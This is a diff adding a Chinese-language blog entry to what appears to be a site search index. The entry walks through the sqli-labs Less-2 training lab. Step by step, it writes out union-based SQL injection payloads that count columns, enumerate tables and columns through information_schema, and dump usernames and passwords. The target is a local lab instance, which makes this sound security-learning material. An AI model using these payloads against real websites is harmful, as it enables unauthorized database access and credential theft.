@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Less2</title>
+      <link href="/2019/09/15/sqli-labs%20Less2/"/>
+      <url>/2019/09/15/sqli-labs%20Less2/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Less-2（GET-型基于错误的整型注入）"><a href="#Less-2（GET-型基于错误的整型注入）" class="headerlink" title="Less-2（GET 型基于错误的整型注入）"></a>Less-2（GET 型基于错误的整型注入）</h3><ol><li><strong>GET 方式提交 id</strong></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.128/sqli-labs-master/Less-2/?id=1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/15/hczVTEGkLxBKqg3.png" alt="less2-1.png"></p><ol start="2"><li><strong>order by 猜测字段数</strong></li></ol><p><a href="http://192.168.150.128/sqli-labs-master/Less-2/?id=1" target="_blank" rel="noopener">http://192.168.150.128/sqli-labs-master/Less-2/?id=1</a> order by 1%23<br>……<br><a href="http://192.168.150.128/sqli-labs-master/Less-2/?id=1" target="_blank" rel="noopener">http://192.168.150.128/sqli-labs-master/Less-2/?id=1</a> order by 4%23 </p><p><img src="https://i.loli.net/2019/09/15/t2iVy8IpFEuqC4v.png" alt="less2-3.png"></p><ol start="3"><li><strong>查看字段显示位置</strong></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 union select 1,2,3%23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/15/rRZdH8sDgtSEU9z.png" alt="less2-4.png"></p><ol start="4"><li><strong>获取数据库登录用户、数据库名</strong></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 union select 1,user(),database()%23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/15/t49AcbmUJz5oqRe.png" alt="less2-5.png"></p><ol start="5"><li><strong>爆表</strong></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=&apos;security&apos;%23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/15/o58QxD4vF27AnON.png" alt="less2-6.png"></p><ol start="6"><li><strong>爆表中的字段</strong></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&apos;security&apos; AND TABLE_NAME=&apos;users&apos;%23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/15/5SQJhzNPgod3REq.png" alt="less2-7.png"></p><ol start="7"><li><strong>爆数据</strong></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/15/RdtWMP52Z9SOe8B.png" alt="less2-8.png"></p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://www.cnblogs.com/omnis/p/8313148.html" target="_blank" rel="noopener">【sqli-labs】 less2 GET - Error based - Intiger based (基于错误的GET整型注入)</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web security </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sqli-labs </tag>
+            
+            <tag> SQL Injection </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Less1</title>
       <link href="/2019/09/10/sqli-labs%20Less1/"/>
       <url>/2019/09/10/sqli-labs%20Less1/</url>
